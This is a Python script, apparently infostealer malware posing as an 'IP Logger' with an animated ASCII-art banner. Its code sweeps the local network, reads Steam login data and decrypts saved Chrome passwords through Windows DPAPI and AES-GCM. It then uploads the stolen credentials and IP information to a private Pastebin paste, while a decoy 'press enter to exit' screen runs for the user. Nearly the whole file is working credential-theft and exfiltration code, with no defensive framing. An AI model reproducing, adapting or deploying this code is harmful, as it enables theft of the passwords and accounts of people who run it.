import requests, os, sys, time, ipaddress, socket, datetime, re, json, win32crypt, base64, sqlite3, shutil; from pastebin import PastebinAPI; from Cryptodome.Cipher import AES
api_dev_key = your_api_key #can be found here https://pastebin.com/doc_api?ref=free-for-dev.com
username = your_pastebin_account_name
password = your_pastebin_password
pb = PastebinAPI()
api_user_key = pb.generate_user_key(api_dev_key, username, password) #pastebin api_user_key
#print(api_user_key)
date = datetime.datetime.now().strftime("%A, %d. %B %Y %I:%M%p")

# <mac adress & ips>
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80)) #public server
ip = requests.get('https://api.ipify.org').text #public ip
ipl = s.getsockname()[0] #local ip
network = ipaddress.ip_network(ipl+'/24', strict=False)
for host in network.hosts():
    s.sendto("hi".encode('utf-8'), (host.compressed, 80)) #ping net
ips = str(os.popen('arp -a').readlines()).replace('\\n', '\n').replace("'", '').replace(',', '').replace('[', '').replace(']', '') #arp parse
# </mac adress & ips>

#<steam login stealer>
def steam_log():
    steam_config_path = os.path.normpath(r"%s\Steam\Config\loginusers.vdf"%(os.environ['PROGRAMFILES(X86)']))
    login_file = open(steam_config_path)
    return login_file.read()
#</steam login stealer>

#<chrome password stealer>
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        return '[ERR] Unable to decrypt, Chrome version <80 not supported.'

def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        return None 
   
def chrome_pass():
    text = ''
    try:
        #(1) Get secret key
        secret_key = get_secret_key()
        #Search user profile or default folder (this is where the encrypted login password is stored)
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
        for folder in folders:
        	#(2) Get ciphertext from sqlite database
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
            conn = get_db_connection(chrome_path_login_db)
            if(secret_key and conn):
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index,login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if(url!="" and username!="" and ciphertext!=""):
                        #(3) Filter the initialisation vector & encrypted password from ciphertext 
                        #(4) Use AES algorithm to decrypt the password
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        text += "\nURL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password)
                        #(5) Save into CSV 
                #Close database connection
                cursor.close()
                conn.close()
                #Delete temp login db
                os.remove("Loginvault.db")
        return text
    except Exception as e:
        return 'Error Occured'
#</chrome password stealer>

#<pastebin post>
pb.paste(api_dev_key, f'Host ip: {ip} \nLocal ping:{ips}\nSteam loginusers: {steam_log()}\nChrome: {chrome_pass()}', api_user_key = api_user_key, 
                   paste_name = date, paste_format = None, 
                   paste_private = 'private', paste_expire_date = 'N')
#</pastebin post>

#<trick> you can change this whatever you want, its just my version
print('\033[?25l', end="") #just hiding cursor
logo = [  
[
'                                                                   ⣿⣿⣿⣿⣿⣿⣿⡇⡌⡰⢃⡿⡡⠟⣠⢹⡏⣦⢸⣿⣿⣿⣿⣿⣿',
'                                                                   ⣿⣿⣿⣿⣿⣿⡿⢰⠋⡿⢋⣐⡈⣽⠟⢀⢻⢸⡂⣿⣿⣿⣿⣿⣿',
'                                                                   ⣿⣿⣿⣿⣿⣋⠴⢋⡘⢰⣄⣀⣅⣡⠌⠛⠆⣿⡄⣿⣿⣿⣿⣿⣿',
'                                                                   ⣿⣿⣿⣿⣿⣿⣶⣁⣐⠄⠹⣟⠯⢿⣷⠾⠁⠥⠃⣹⣿⣿⣿⣿⣿',
'                                                                   ⣿⣿⣿⣿⠟⠋⡍⢴⣶⣶⣶⣤⣭⡐⢶⣾⣿⣶⡆⢨⠛⠻⣿⣿⣿',
'                                                                   ⣿⣿⣿⢏⣘⣚⣣⣾⣿⣿⣿⣿⣿⣿⢈⣿⣿⣿⣧⣘⠶⢂⠹⣿⣿',
'                                                                   ⣿⣿⠃⣾⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⡀⢿⣿⣿⣿⣿⣿⣿⡇⣿⣿',
'██╗██████╗     ██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗  ⣿⣿⡄⣿⣿⣿⣿⣿⣿⡯⠄⠄⠾⠿⠿⢦⣝⠻⣿⣿⣿⣿⠇⣿⣿',
'██║██╔══██╗    ██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗ ⣿⣿⣷⣜⠿⢿⣿⡿⠟⣴⣾⣿⡇⢰⣾⣦⡹⣷⣮⡙⢟⣩⣾⣿⣿',
'██║██████╔╝    ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝ ⣿⣿⣿⣿⣿⣆⢶⣶⣦⢻⣿⣿⣷⢸⣿⣿⣷⣌⠻⡷⣺⣿⣿⣿⣿',
'██║██╔═══╝     ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗ ⣿⣿⣿⣿⣿⣿⡜⢿⣿⡎⢿⣿⣿⡬⣿⣿⣿⡏⢦⣔⠻⣿⣿⣿⣿',
'██║██║         ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║ ⣿⣿⣿⣿⣿⣿⣿⠎⠻⣷⡈⢿⣿⡇⢛⣻⣿⣿⢸⣿⣷⠌⡛⢿⣿',
'╚═╝╚═╝         ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ⣿⣿⣿⣿⣿⣿⡏⢰⣷⡙⢷⣌⢻⣿⣿⣿⣿⣿⢸⡿⢡⣾⣿⡶⠻',
'                                                                   ⣿⣿⣿⣿⣿⡟⣰⣶⣭⣙⠊⣿⣷⣬⣛⠻⣿⣿⠈⣴⣿⣿⣿⠃⠄',
'                                                                   ⣿⣿⣿⣿⡟⠄⠹⢿⣿⣿⣿⣤⠻⠟⠋⠡⠘⠋⢸⣿⣿⡿⠁⠄⠄',
'                                                                   ⣿⣿⣿⣿⠁⠄⠄⠄⠙⢻⣿⣿⣇⠄⠄⠄⠄⠄⣺⡿⠛⠄⠄⠄⠄',
'                                                                   ⣿⣿⣿⡏⠄⠄⠄⠄⠄⠄⠄⠉⠻⠷⠄⢠⣄⠄⠋⠄⠄⠄⠄⠄⠄',
'                                                                   ⣿⣿⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠸⣿⠄⠄⠄⠄⠄⠄⠄⠄',
],
[
' ___ ___ ___ ___ ___   ___ _  _ _____ ___ ___   _____ ___    _____  _____ _____ ',
'| _ | _ | __/ __/ __| | __| \| |_   _| __| _ \ |_   _/ _ \  | __\ \/ |_ _|_   _|',
'|  _|   | _|\__ \__ \ | _|| .` | | | | _||   /   | || (_) | | _| >  < | |  | |',
'|_| |_|_|___|___|___/ |___|_|\_| |_| |___|_|_\   |_| \___/  |___/_/\_|___| |_|'
]
]
def animated_text(text: str | list, timer: int | float):
    if type(text) is str:
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(timer)
    if type(text) is list:
        for values in text:
            print(values)
            time.sleep(timer)
animated_text(logo[0], 0.01)
animated_text(f'https://pastebin.com/u/{username}\n', 0.05)
animated_text(logo[1], 0.01)
input()
#</trick>